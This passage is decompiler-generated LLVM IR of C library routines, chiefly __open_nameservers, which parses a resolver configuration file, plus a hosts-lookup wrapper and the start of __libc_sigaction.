  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %r28.global-to-local, { 0, 2, 3, 5, 4, 1, 6, 7, 8, 9 }
  uselistorder i32* %r18.global-to-local, { 0, 3, 5, 1, 4, 2, 6 }
  uselistorder i32* %r17.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r16.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 16, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 1, 17, 0, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 0, 2, 1 }
  uselistorder i32 101, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 4, 0, 3, 2 }
  uselistorder i32 17, { 1, 2, 13, 3, 16, 4, 5, 0, 6, 7, 8, 9, 10, 17, 18, 14, 15, 12, 11 }
  uselistorder i32 (i32)* @inet_addr, { 1, 5, 4, 3, 2, 0 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0, 4, 3 }
  uselistorder i32 (i32)* @__libc_close, { 5, 4, 3, 2, 10, 9, 1, 0, 8, 7, 6 }
  uselistorder i16* @global_var_1001d7a4.438, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 1, 4, 0 }
  uselistorder i32 512, { 2, 3, 0, 1, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_10008e98, { 1, 0 }
  uselistorder label %dec_label_pc_10008e68, { 1, 0 }
  uselistorder label %dec_label_pc_10008e38, { 1, 0 }
  uselistorder label %dec_label_pc_10008e28, { 1, 0 }
  uselistorder label %dec_label_pc_10008e18, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_100088f4.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10008dfc, { 1, 0 }
  uselistorder label %dec_label_pc_10008de4, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10008e00thread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008d8c, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_10008d64, { 1, 0 }
  uselistorder label %dec_label_pc_10008d40, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_10008d38, { 1, 0 }
  uselistorder label %dec_label_pc_10008d24, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10008c90, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10008bcc, { 1, 0 }
  uselistorder label %dec_label_pc_10008bc4, { 1, 0 }
  uselistorder label %dec_label_pc_10008a68, { 1, 0 }
  uselistorder label %dec_label_pc_100089e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008904, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v2_10008ecc = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_10008ecc, i32* @r3, align 4
  %v0_10008ed8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1001d7a8.385 to i32), i32* %r3.global-to-local, align 4
  %v0_10008ee0 = call i32 @__pthread_return_0()
  store i32 %v0_10008ee0, i32* %r3.global-to-local, align 4
  %v3_10008ee8 = load i32, i32* @global_var_1001d898.386, align 4
  %v2_10008eec = icmp sgt i32 %v3_10008ee8, 0
  br i1 %v2_10008eec, label %dec_label_pc_10009164, label %dec_label_pc_10008ef4

dec_label_pc_10008ef4:                            ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_1000cfb8.451 to i32), i32* %r3.global-to-local, align 4
  store i32 268472076, i32* @lr, align 4
  %v3_10008f08 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_1000cfb8.451 to i32), i32 ptrtoint (i32* @global_var_1000cfcc.450 to i32))
  store i32 %v3_10008f08, i32* %r3.global-to-local, align 4
  store i32 %v3_10008f08, i32* @r26, align 4
  %v3_10008f0c = icmp eq i32 %v3_10008f08, 0
  br i1 %v3_10008f0c, label %dec_label_pc_10008f14, label %dec_label_pc_10009128.preheader

dec_label_pc_10008f14:                            ; preds = %dec_label_pc_10008ef4
  %v0_10008f18 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1000cfd0.452 to i32), i32* %r3.global-to-local, align 4
  store i32 268472100, i32* @lr, align 4
  %v3_10008f20 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_1000cfd0.452 to i32), i32 %v0_10008f18)
  store i32 %v3_10008f20, i32* %r3.global-to-local, align 4
  store i32 %v3_10008f20, i32* @r26, align 4
  %v3_10008f24 = icmp eq i32 %v3_10008f20, 0
  br i1 %v3_10008f24, label %dec_label_pc_10009158, label %dec_label_pc_10009128.preheader

dec_label_pc_10009128.preheader:                  ; preds = %dec_label_pc_10008ef4, %dec_label_pc_10008f14
  %v0_1000913416 = phi i32 [ %v3_10008f08, %dec_label_pc_10008ef4 ], [ %v3_10008f20, %dec_label_pc_10008f14 ]
  %v2_10009128 = ptrtoint i32* %stack_var_-164 to i32
  %v1_10008f342 = bitcast i32* %stack_var_-164 to i8*
  %v3_10009018 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_10009128

dec_label_pc_10008f30:                            ; preds = %dec_label_pc_10008f48
  %v1_10008f30 = add i32 %v0_10008ff09, 1
  store i32 %v1_10008f30, i32* %r3.global-to-local, align 4
  %v1_10008f34 = inttoptr i32 %v1_10008f30 to i8*
  %v2_10008f34 = load i8, i8* %v1_10008f34, align 1
  %v3_10008f34 = zext i8 %v2_10008f34 to i32
  store i32 %v3_10008f34, i32* %r11.global-to-local, align 4
  %v3_10008f3c = icmp eq i8 %v2_10008f34, 0
  br i1 %v3_10008f3c, label %dec_label_pc_10009128.backedge, label %dec_label_pc_10008f48

dec_label_pc_10008f48:                            ; preds = %dec_label_pc_10008f48.lr.ph, %dec_label_pc_10008f30
  %v0_10008f4c.in = phi i32 [ %v3_10008f344, %dec_label_pc_10008f48.lr.ph ], [ %v3_10008f34, %dec_label_pc_10008f30 ]
  %v0_10008f60 = phi i32 [ %v3_10008f344, %dec_label_pc_10008f48.lr.ph ], [ %v3_10008f34, %dec_label_pc_10008f30 ]
  %v0_10008ff09 = phi i32 [ %v2_10009128, %dec_label_pc_10008f48.lr.ph ], [ %v1_10008f30, %dec_label_pc_10008f30 ]
  %v0_10008f4c = mul nuw nsw i32 %v0_10008f4c.in, 2
  %v2_10008f4c = add i32 %v0_10008f4c, %v3_10008f48.pre
  %v3_10008f4c = inttoptr i32 %v2_10008f4c to i16*
  %v4_10008f4c = load i16, i16* %v3_10008f4c, align 2
  %v1_10008f50 = and i16 %v4_10008f4c, 32
  %v3_10008f50 = icmp eq i16 %v1_10008f50, 0
  br i1 %v3_10008f50, label %dec_label_pc_10008f58, label %dec_label_pc_10008f30

dec_label_pc_10008f58:                            ; preds = %dec_label_pc_10008f48
  %v3_10008f58 = icmp eq i32 %v0_10008f60, 10
  br i1 %v3_10008f58, label %dec_label_pc_10009128.backedge, label %dec_label_pc_10008f60

dec_label_pc_10009128.backedge:                   ; preds = %dec_label_pc_10008f30, %dec_label_pc_100090dc, %dec_label_pc_100090e4, %dec_label_pc_1000911c, %dec_label_pc_10008f34.preheader, %dec_label_pc_10008f58, %dec_label_pc_10008f60, %dec_label_pc_10009084
  %v0_10009134.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_10009128

dec_label_pc_10008f60:                            ; preds = %dec_label_pc_10008f58
  %v3_10008f60 = icmp eq i32 %v0_10008f60, 35
  br i1 %v3_10008f60, label %dec_label_pc_10009128.backedge, label %dec_label_pc_10008f68

dec_label_pc_10008f68:                            ; preds = %dec_label_pc_10008f60
  store i32 0, i32* @r27, align 4
  store i32 %v2_10008ecc, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_10008ff010 = inttoptr i32 %v0_10008ff09 to i8*
  %v2_10008ff011 = load i8, i8* %v1_10008ff010, align 1
  %v3_10008ff414 = icmp eq i8 %v2_10008ff011, 0
  br i1 %v3_10008ff414, label %dec_label_pc_10009004, label %dec_label_pc_10008ffc

dec_label_pc_10008f7c:                            ; preds = %dec_label_pc_10008ffc
  %v3_10008f7c = load i32, i32* @global_var_1001d818, align 4
  store i32 %v3_10008f7c, i32* %r11.global-to-local, align 4
  %v1_10008f80 = mul i32 %v0_10008f80, 4
  %v1_10008f84 = load i32, i32* %r6.global-to-local, align 4
  %v2_10008f84 = add i32 %v1_10008f84, %v1_10008f80
  %v2_10008f88 = add i32 %v2_10008f84, 16
  %v3_10008f88 = inttoptr i32 %v2_10008f88 to i32*
  store i32 %v0_10008f88, i32* %v3_10008f88, align 4
  %v0_10008f94.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008f94

dec_label_pc_10008f90:                            ; preds = %dec_label_pc_10008fa8
  %v1_10008f90 = add i32 %v0_10008f90, 1
  store i32 %v1_10008f90, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008f94

dec_label_pc_10008f94:                            ; preds = %dec_label_pc_10008f7c, %dec_label_pc_10008f90
  %v0_10008f90 = phi i32 [ %v0_10008f94.pre, %dec_label_pc_10008f7c ], [ %v1_10008f90, %dec_label_pc_10008f90 ]
  %v1_10008f94 = inttoptr i32 %v0_10008f90 to i8*
  %v2_10008f94 = load i8, i8* %v1_10008f94, align 1
  %v3_10008f98 = icmp eq i8 %v2_10008f94, 0
  br i1 %v3_10008f98, label %dec_label_pc_10008fc4, label %dec_label_pc_10008fa8

dec_label_pc_10008fa8:                            ; preds = %dec_label_pc_10008f94
  %v3_10008fa0 = icmp eq i8 %v2_10008f94, 10
  %v3_10008f94 = zext i8 %v2_10008f94 to i32
  %v1_10008f9c = mul nuw nsw i32 %v3_10008f94, 2
  %v1_10008fa8 = load i32, i32* %r11.global-to-local, align 4
  %v2_10008fa8 = add i32 %v1_10008fa8, %v1_10008f9c
  %v3_10008fa8 = inttoptr i32 %v2_10008fa8 to i16*
  %v4_10008fa8 = load i16, i16* %v3_10008fa8, align 2
  %v1_10008fac = and i16 %v4_10008fa8, 32
  %v3_10008fac.not = icmp ne i16 %v1_10008fac, 0
  %brmerge = or i1 %v3_10008fa0, %v3_10008fac.not
  br i1 %brmerge, label %dec_label_pc_10008fc4, label %dec_label_pc_10008f90

dec_label_pc_10008fbc:                            ; preds = %dec_label_pc_10008fd8
  %v0_10008fbc = load i32, i32* %r7.global-to-local, align 4
  %v1_10008fbc = trunc i32 %v0_10008fbc to i8
  store i8 %v1_10008fbc, i8* %v1_10008fc4, align 1
  %v0_10008fc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_10008fc0 = add i32 %v0_10008fc0, 1
  store i32 %v1_10008fc0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008fc4

dec_label_pc_10008fc4:                            ; preds = %dec_label_pc_10008fa8, %dec_label_pc_10008f94, %dec_label_pc_10008fbc
  %v0_10008ff0 = phi i32 [ %v1_10008fc0, %dec_label_pc_10008fbc ], [ %v0_10008f90, %dec_label_pc_10008f94 ], [ %v0_10008f90, %dec_label_pc_10008fa8 ]
  %v1_10008fc4 = inttoptr i32 %v0_10008ff0 to i8*
  %v2_10008fc4 = load i8, i8* %v1_10008fc4, align 1
  %v3_10008fc4 = zext i8 %v2_10008fc4 to i32
  %v3_10008fc8 = icmp eq i8 %v2_10008fc4, 0
  %v1_10008fcc = mul nuw nsw i32 %v3_10008fc4, 2
  store i32 %v1_10008fcc, i32* %r11.global-to-local, align 4
  br i1 %v3_10008fc8, label %dec_label_pc_10008fec, label %dec_label_pc_10008fd8

dec_label_pc_10008fd8:                            ; preds = %dec_label_pc_10008fc4
  %v3_10008fd0 = icmp eq i8 %v2_10008fc4, 10
  %v3_10008fd8 = load i32, i32* @global_var_1001d818, align 4
  %v2_10008fdc = add i32 %v3_10008fd8, %v1_10008fcc
  %v3_10008fdc = inttoptr i32 %v2_10008fdc to i16*
  %v4_10008fdc = load i16, i16* %v3_10008fdc, align 2
  %v1_10008fe0 = and i16 %v4_10008fdc, 32
  %v3_10008fe0.not = icmp ne i16 %v1_10008fe0, 0
  %brmerge27 = or i1 %v3_10008fd0, %v3_10008fe0.not
  br i1 %brmerge27, label %dec_label_pc_10008fbc, label %dec_label_pc_10008fec

dec_label_pc_10008fec:                            ; preds = %dec_label_pc_10008fd8, %dec_label_pc_10008fc4
  %v0_10008fec = load i32, i32* @r27, align 4
  %v1_10008fec = add i32 %v0_10008fec, 1
  store i32 %v1_10008fec, i32* @r27, align 4
  %v2_10008ff0 = load i8, i8* %v1_10008fc4, align 1
  %v3_10008ff4 = icmp eq i8 %v2_10008ff0, 0
  br i1 %v3_10008ff4, label %dec_label_pc_10009004, label %dec_label_pc_10008ffc

dec_label_pc_10008ffc:                            ; preds = %dec_label_pc_10008f68, %dec_label_pc_10008fec
  %v0_10008f88 = phi i32 [ %v0_10008ff0, %dec_label_pc_10008fec ], [ %v0_10008ff09, %dec_label_pc_10008f68 ]
  %v0_10008f80 = phi i32 [ %v1_10008fec, %dec_label_pc_10008fec ], [ 0, %dec_label_pc_10008f68 ]
  %tmp33 = icmp slt i32 %v0_10008f80, 5
  br i1 %tmp33, label %dec_label_pc_10008f7c, label %dec_label_pc_10009004

dec_label_pc_10009004:                            ; preds = %dec_label_pc_10008fec, %dec_label_pc_10008ffc, %dec_label_pc_10008f68
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1000cfe8.453 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_10009018 = call i32 @__GI_strcoll(i8* %v3_10009018, i32 ptrtoint ([11 x i8]* @global_var_1000cfe8.453 to i32))
  store i32 %v4_10009018, i32* %r3.global-to-local, align 4
  %v3_1000901c = icmp eq i32 %v4_10009018, 0
  br i1 %v3_1000901c, label %dec_label_pc_10009048, label %dec_label_pc_1000906c

dec_label_pc_10009028:                            ; preds = %dec_label_pc_10009060
  %v1_10009028 = add i32 %v2_10009050, 24
  %v2_10009028 = inttoptr i32 %v1_10009028 to i32*
  %v3_10009028 = load i32, i32* %v2_10009028, align 4
  store i32 %v3_10009028, i32* %r3.global-to-local, align 4
  store i32 268472368, i32* @lr, align 4
  %v1_1000902c = call i32 @__GI_strdup(i32 %v3_10009028)
  store i32 %v1_1000902c, i32* %r3.global-to-local, align 4
  %v0_10009034 = load i32, i32* @r29, align 4
  %v1_10009034 = add i32 %v0_10009034, 1
  store i32 %v1_10009034, i32* %r11.global-to-local, align 4
  %v1_10009038 = mul i32 %v0_10009034, 4
  store i32 %v1_10009034, i32* @global_var_1001d898.386, align 4
  %v3_10009044 = add i32 %v1_10009038, ptrtoint (i32* @global_var_1001ff04.387 to i32)
  %v4_10009044 = inttoptr i32 %v3_10009044 to i32*
  store i32 %v1_1000902c, i32* %v4_10009044, align 4
  br label %dec_label_pc_10009048

dec_label_pc_10009048:                            ; preds = %dec_label_pc_10009004, %dec_label_pc_10009028
  %v0_10009048 = load i32, i32* @r31, align 4
  %v1_10009048 = load i32, i32* @r27, align 4
  %v2_10009048 = icmp slt i32 %v0_10009048, %v1_10009048
  %v1_1000904c = mul i32 %v0_10009048, 4
  %v0_10009050 = load i32, i32* @r1, align 4
  %v2_10009050 = add i32 %v0_10009050, %v1_1000904c
  br i1 %v2_10009048, label %dec_label_pc_10009060, label %dec_label_pc_1000906c

dec_label_pc_10009060:                            ; preds = %dec_label_pc_10009048
  %v3_10009060 = load i32, i32* @global_var_1001d898.386, align 4
  %tmp35 = icmp slt i32 %v3_10009060, 3
  br i1 %tmp35, label %dec_label_pc_10009028, label %dec_label_pc_1000906c

dec_label_pc_1000906c:                            ; preds = %dec_label_pc_10009060, %dec_label_pc_10009048, %dec_label_pc_10009004
  %v0_10009070 = load i32, i32* @r30, align 4
  store i32 %v0_10009070, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000cff4.454 to i32), i32* @r4, align 4
  %v3_10009078 = inttoptr i32 %v0_10009070 to i8*
  %v4_10009078 = call i32 @__GI_strcoll(i8* %v3_10009078, i32 ptrtoint ([7 x i8]* @global_var_1000cff4.454 to i32))
  store i32 %v4_10009078, i32* %r3.global-to-local, align 4
  %v3_1000907c = icmp eq i32 %v4_10009078, 0
  br i1 %v3_1000907c, label %dec_label_pc_100090bc.preheader, label %dec_label_pc_10009084

dec_label_pc_10009084:                            ; preds = %dec_label_pc_1000906c
  %v0_10009088 = load i32, i32* @r30, align 4
  store i32 %v0_10009088, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000cffc.455 to i32), i32* @r4, align 4
  %v3_10009090 = inttoptr i32 %v0_10009088 to i8*
  %v4_10009090 = call i32 @__GI_strcoll(i8* %v3_10009090, i32 ptrtoint ([7 x i8]* @global_var_1000cffc.455 to i32))
  store i32 %v4_10009090, i32* %r3.global-to-local, align 4
  %v3_10009094 = icmp eq i32 %v4_10009090, 0
  br i1 %v3_10009094, label %dec_label_pc_100090bc.preheader, label %dec_label_pc_10009128.backedge

dec_label_pc_100090bc.preheader:                  ; preds = %dec_label_pc_1000906c, %dec_label_pc_10009084
  store i32 ptrtoint (i32* @global_var_1001fef4.442 to i32), i32* @r31, align 4
  %v3_100090c841 = load i32, i32* @global_var_1001d89c.440, align 4
  %v2_100090cc43 = icmp sgt i32 %v3_100090c841, 0
  %v1_100090d045 = add i32 %v3_100090c841, -1
  %v1_100090d446 = mul i32 %v1_100090d045, 4
  store i32 %v1_100090d446, i32* %r11.global-to-local, align 4
  br i1 %v2_100090cc43, label %dec_label_pc_100090a0, label %dec_label_pc_100090dc

dec_label_pc_100090a0:                            ; preds = %dec_label_pc_100090bc.preheader, %dec_label_pc_100090a0
  %v1_100090d448 = phi i32 [ %v1_100090d4, %dec_label_pc_100090a0 ], [ %v1_100090d446, %dec_label_pc_100090bc.preheader ]
  %v1_100090d047 = phi i32 [ %v1_100090d0, %dec_label_pc_100090a0 ], [ %v1_100090d045, %dec_label_pc_100090bc.preheader ]
  %v2_100090a0 = add i32 %v1_100090d448, ptrtoint (i32* @global_var_1001fef4.442 to i32)
  %v3_100090a0 = inttoptr i32 %v2_100090a0 to i32*
  %v4_100090a0 = load i32, i32* %v3_100090a0, align 4
  store i32 %v4_100090a0, i32* @r3, align 4
  store i32 %v1_100090d047, i32* @global_var_1001d89c.440, align 4
  store i32 268472492, i32* @lr, align 4
  %v0_100090a8 = call i32 @free()
  store i32 %v0_100090a8, i32* %r3.global-to-local, align 4
  %v3_100090ac = load i32, i32* @global_var_1001d89c.440, align 4
  %v1_100090b4 = mul i32 %v3_100090ac, 4
  %v1_100090b8 = load i32, i32* @r31, align 4
  %v3_100090b8 = add i32 %v1_100090b8, %v1_100090b4
  %v4_100090b8 = inttoptr i32 %v3_100090b8 to i32*
  store i32 0, i32* %v4_100090b8, align 4
  store i32 ptrtoint (i32* @global_var_1001fef4.442 to i32), i32* @r31, align 4
  %v3_100090c8 = load i32, i32* @global_var_1001d89c.440, align 4
  %v2_100090cc = icmp sgt i32 %v3_100090c8, 0
  %v1_100090d0 = add i32 %v3_100090c8, -1
  %v1_100090d4 = mul i32 %v1_100090d0, 4
  store i32 %v1_100090d4, i32* %r11.global-to-local, align 4
  br i1 %v2_100090cc, label %dec_label_pc_100090a0, label %dec_label_pc_100090dc

dec_label_pc_100090dc:                            ; preds = %dec_label_pc_100090a0, %dec_label_pc_100090bc.preheader
  %v3_1000911c59 = phi i32 [ %v3_100090c841, %dec_label_pc_100090bc.preheader ], [ %v3_100090c8, %dec_label_pc_100090a0 ]
  %v1_1000910449 = load i32, i32* @r27, align 4
  %v2_1000910450 = icmp sgt i32 %v1_1000910449, 1
  %v0_1000910c53 = load i32, i32* @r1, align 4
  %v2_1000910c54 = add i32 %v0_1000910c53, 4
  br i1 %v2_1000910450, label %dec_label_pc_1000911c, label %dec_label_pc_10009128.backedge

dec_label_pc_100090e4:                            ; preds = %dec_label_pc_1000911c
  %v1_100090e4 = add i32 %v2_1000910c55, 24
  %v2_100090e4 = inttoptr i32 %v1_100090e4 to i32*
  %v3_100090e4 = load i32, i32* %v2_100090e4, align 4
  store i32 %v3_100090e4, i32* %r3.global-to-local, align 4
  store i32 268472556, i32* @lr, align 4
  %v1_100090e8 = call i32 @__GI_strdup(i32 %v3_100090e4)
  store i32 %v1_100090e8, i32* %r3.global-to-local, align 4
  %v0_100090f0 = load i32, i32* @r29, align 4
  %v1_100090f0 = add i32 %v0_100090f0, 1
  store i32 %v1_100090f0, i32* %r11.global-to-local, align 4
  %v1_100090f4 = mul i32 %v0_100090f0, 4
  store i32 %v1_100090f0, i32* @global_var_1001d89c.440, align 4
  %v3_10009100 = add i32 %v1_100090f4, ptrtoint (i32* @global_var_1001fef4.442 to i32)
  %v4_10009100 = inttoptr i32 %v3_10009100 to i32*
  store i32 %v1_100090e8, i32* %v4_10009100, align 4
  %v0_10009104.pre = load i32, i32* @r31, align 4
  %v1_10009104 = load i32, i32* @r27, align 4
  %v2_10009104 = icmp slt i32 %v0_10009104.pre, %v1_10009104
  br i1 %v2_10009104, label %dec_label_pc_100090e4.dec_label_pc_1000911c_crit_edge, label %dec_label_pc_10009128.backedge

dec_label_pc_100090e4.dec_label_pc_1000911c_crit_edge: ; preds = %dec_label_pc_100090e4
  %v0_1000910c = load i32, i32* @r1, align 4
  %v1_10009108 = mul i32 %v0_10009104.pre, 4
  %v2_1000910c = add i32 %v0_1000910c, %v1_10009108
  %v3_1000911c.pre = load i32, i32* @global_var_1001d89c.440, align 4
  br label %dec_label_pc_1000911c

dec_label_pc_1000911c:                            ; preds = %dec_label_pc_100090dc, %dec_label_pc_100090e4.dec_label_pc_1000911c_crit_edge
  %v3_1000911c = phi i32 [ %v3_1000911c.pre, %dec_label_pc_100090e4.dec_label_pc_1000911c_crit_edge ], [ %v3_1000911c59, %dec_label_pc_100090dc ]
  %v2_1000910c55 = phi i32 [ %v2_1000910c, %dec_label_pc_100090e4.dec_label_pc_1000911c_crit_edge ], [ %v2_1000910c54, %dec_label_pc_100090dc ]
  %tmp37 = icmp slt i32 %v3_1000911c, 4
  br i1 %tmp37, label %dec_label_pc_100090e4, label %dec_label_pc_10009128.backedge

dec_label_pc_10009128:                            ; preds = %dec_label_pc_10009128.backedge, %dec_label_pc_10009128.preheader
  %v0_10009134 = phi i32 [ %v0_10009134.pre, %dec_label_pc_10009128.backedge ], [ %v0_1000913416, %dec_label_pc_10009128.preheader ]
  store i32 %v2_10009128, i32* %r3.global-to-local, align 4
  store i32 268472636, i32* @lr, align 4
  %v3_10009138 = call i32 @fgets(i32 %v2_10009128, i32 128, i32 %v0_10009134)
  store i32 %v3_10009138, i32* %r3.global-to-local, align 4
  %v3_1000913c = icmp eq i32 %v3_10009138, 0
  br i1 %v3_1000913c, label %dec_label_pc_1000914c, label %dec_label_pc_10008f34.preheader

dec_label_pc_10008f34.preheader:                  ; preds = %dec_label_pc_10009128
  store i32 %v2_10009128, i32* %r3.global-to-local, align 4
  %v2_10008f343 = load i8, i8* %v1_10008f342, align 4
  %v3_10008f344 = zext i8 %v2_10008f343 to i32
  store i32 %v3_10008f344, i32* %r11.global-to-local, align 4
  %v3_10008f3c6 = icmp eq i8 %v2_10008f343, 0
  br i1 %v3_10008f3c6, label %dec_label_pc_10009128.backedge, label %dec_label_pc_10008f48.lr.ph

dec_label_pc_10008f48.lr.ph:                      ; preds = %dec_label_pc_10008f34.preheader
  %v3_10008f48.pre = load i32, i32* @global_var_1001d818, align 4
  br label %dec_label_pc_10008f48

dec_label_pc_1000914c:                            ; preds = %dec_label_pc_10009128
  %v0_1000914c = load i32, i32* @r26, align 4
  store i32 %v0_1000914c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10009154.456 to i32), i32* @lr, align 4
  %v1_10009150 = inttoptr i32 %v0_1000914c to i16*
  %v2_10009150 = call i32 @__GI_fclose(i16* %v1_10009150)
  store i32 %v2_10009150, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009164

dec_label_pc_10009158:                            ; preds = %dec_label_pc_10008f14
  %v0_10009158 = call i32 @__GI___h_errno_location()
  store i32 %v0_10009158, i32* %r3.global-to-local, align 4
  %v2_10009160 = inttoptr i32 %v0_10009158 to i32*
  store i32 3, i32* %v2_10009160, align 4
  br label %dec_label_pc_10009164

dec_label_pc_10009164:                            ; preds = %entry, %dec_label_pc_1000914c, %dec_label_pc_10009158
  store i32 %v2_10008ecc, i32* @r3, align 4
  %v0_1000916c = call i32 @__pthread_return_void()
  store i32 %v0_1000916c, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000916c

; uselistorder directives
  uselistorder i32 %v3_10008f344, { 2, 0, 1 }
  uselistorder i32 %v1_100090d446, { 1, 0 }
  uselistorder i32 %v1_100090d045, { 1, 0 }
  uselistorder i32 %v0_10008f80, { 1, 0 }
  uselistorder i32 %v1_10008fcc, { 1, 0 }
  uselistorder i8* %v1_10008fc4, { 0, 2, 1 }
  uselistorder i8 %v2_10008f94, { 2, 0, 1 }
  uselistorder i32 %v0_10008f90, { 0, 1, 3, 2 }
  uselistorder i32 %v3_10008f34, { 1, 0, 2 }
  uselistorder i32 %v1_10008f30, { 0, 2, 1 }
  uselistorder i32 %v2_10009128, { 1, 3, 2, 0 }
  uselistorder i32 %v2_10008ecc, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 10, 11, 12, 13, 1, 2, 3, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 26, 0, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r11.global-to-local, { 0, 3, 4, 1, 5, 6, 7, 8, 2 }
  uselistorder i32 ()* @__GI___h_errno_location, { 1, 5, 4, 3, 0, 2 }
  uselistorder i32 ()* @free, { 0, 13, 12, 11, 10, 9, 8, 7, 22, 21, 6, 5, 4, 3, 2, 15, 14, 1, 20, 19, 18, 17, 16 }
  uselistorder i32* @global_var_1001d89c.440, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_1001fef4.442 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1001ff04.387 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001d7a8.385 to i32), { 0, 2, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_10009164, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000911c, { 1, 0 }
  uselistorder label %dec_label_pc_100090a0, { 1, 0 }
  uselistorder label %dec_label_pc_100090bc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10009048, { 1, 0 }
  uselistorder label %dec_label_pc_10009004, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10008ffc, { 1, 0 }
  uselistorder label %dec_label_pc_10008fc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008f94, { 1, 0 }
  uselistorder label %dec_label_pc_10009128.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_10009128.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v4_10009184 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268472776, i32* @lr, align 4
  %v9_100091c4 = inttoptr i32 %arg3 to i32*
  %v10_100091c4 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_100091c4, i32 %arg4, i32 %arg5, i32 %v4_10009184, i32 %arg7)
  ret i32 %v10_100091c4
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_100091e0 = load i32, i32* @lr, align 4
  store i32 %v0_100091e0, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_100091ec = icmp eq i32* %arg2, null
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_100091fc = add i32 %tmp, 4
  store i32 %v1_100091fc, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_10009204 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_10009204, i32* @r3, align 4
